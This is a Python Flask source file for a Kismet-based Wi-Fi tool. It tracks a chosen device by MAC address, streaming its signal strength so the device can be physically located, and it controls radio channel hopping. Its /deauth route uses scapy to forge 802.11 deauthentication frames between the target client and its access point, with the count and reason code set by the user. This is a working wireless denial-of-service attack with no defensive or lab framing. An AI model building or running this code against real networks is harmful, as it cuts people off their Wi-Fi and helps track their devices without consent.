import requests.exceptions
from flask import Flask, render_template, Response, redirect, url_for, request
from flask_bootstrap import Bootstrap
import json
import time
import scapy.layers.dot11
from scapy.all import sendp

from mac import Mac
from random import randint

mac = Mac()
app = Flask(__name__)
Bootstrap(app)

@app.route('/', methods=['POST', 'GET'])
def home():
    try:
        mac.get_interfaces()
    except requests.exceptions.ConnectionError:
        return "<h2>Please start Kismet or check if your self.IP inside mac.py is pointing to the correct Kismet IP.</h2>"
    return render_template('index.html', mac=mac.mac, channels=mac.interfaces)

@app.route('/mac', methods=['GET', 'POST'])
def set_mac():
    mac.mac = request.form['mac']
    mac.best_seen = -120
    mac.last_seen_time = 0
    mac.last_best_time = 0
    return redirect(url_for('home', mac=mac))

@app.route('/df', methods=['POST', 'GET'])
def df():
    def generate():
        while True:
            response = {}
            results = mac.retrieve_mac()
            rssi = results[0]['kismet.common.signal.last_signal']
            mac.current_channel = results[0]['kismet.device.base.channel']
            mac.bssid = results[0]["dot11.device.last_bssid"]
            response[0] = 120 - (int(rssi) * -1)
            response[1] = rssi
            response[2] = mac.current_channel
            current_time = time.time()
            if rssi > mac.best_seen:
                mac.best_seen = rssi
                mac.last_best_time = current_time
            response[3] = mac.best_seen
            time_since_best = int(time.time() - mac.last_best_time)
            mac.last_seen_time = current_time - results[0]['kismet.device.base.last_time']
            response[4] = time_since_best
            response[5] = mac.last_seen_time
            return_string = 'data:' + json.dumps(response) + "\n\n"
            yield return_string
            time.sleep(.2)
    return Response(generate(), mimetype='text/event-stream')

@app.route('/<string:uuid>/<string:channel>', methods=['GET'])
def lock_channel(uuid, channel):
    uuid = json.loads(uuid)['uuid']
    channel = json.loads(channel)['channel']
    mac.lock_channel(uuid, channel)
    return f"New channel set for {uuid}"

@app.route('/hop/<string:uuid>/<string:option>', methods=['GET'])
def survey_channels(uuid, option):
    uuid = json.loads(uuid)['uuid']
    option = json.loads(option)['option']
    match option:
        case "one":
            mac.survey_channels(uuid=uuid, span=mac.one_six_eleven_params)
        case "two":
            mac.survey_channels(uuid=uuid, span=mac.two_full_params)
        case "three":
            mac.survey_channels(uuid=uuid, span=mac.five_full_params)
        case "four":
            mac.survey_channels(uuid=uuid, span="all")
        case _:
            pass
    return f"New channels set for {uuid}"

@app.route("/deauth/<string:interface>/<string:reason>/<string:count>/<string:behavior>")
def deauth(interface, reason, count, behavior):
    interface = json.loads(interface)['interface']
    reason = int(json.loads(reason)['reason'])
    count = int(json.loads(count)['count'])
    behavior = json.loads(behavior)['behavior']
    print(interface, reason, count, behavior)

    def shoot():
        dot11_bssid = scapy.layers.dot11.Dot11(
            type=0,
            subtype=12,
            addr1=mac.mac,
            addr2=mac.bssid,
            addr3=mac.bssid,
        )
        dot11_client = scapy.layers.dot11.Dot11(
            type=0,
            subtype=12,
            addr1=mac.bssid,
            addr2=mac.mac,
            addr3=mac.bssid
        )
        deauth_frame = scapy.layers.dot11.Dot11Deauth(reason=reason)
        frame_bssid = scapy.layers.dot11.RadioTap() / dot11_bssid / deauth_frame
        frame_client = scapy.layers.dot11.RadioTap() / dot11_client / deauth_frame
        sendp(frame_bssid, iface=interface, count=count, inter=0.100)
        sendp(frame_client, iface=interface, count=count, inter=0.100)

    shoot()
    return f"{count} deauths sent to {mac.mac} from {mac.bssid}"

@app.route('/test', methods=['POST', 'GET'])
def test():
    def generate():
        while True:
            response = {}
            randum_num = randint(1, 100)
            response[0] = randum_num
            return_string = 'data:' + json.dumps(response) + "\n\n"
            print(f'{return_string} test data')
            yield return_string
            time.sleep(.2)
    return Response(generate(), mimetype='text/event-stream')


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5001)
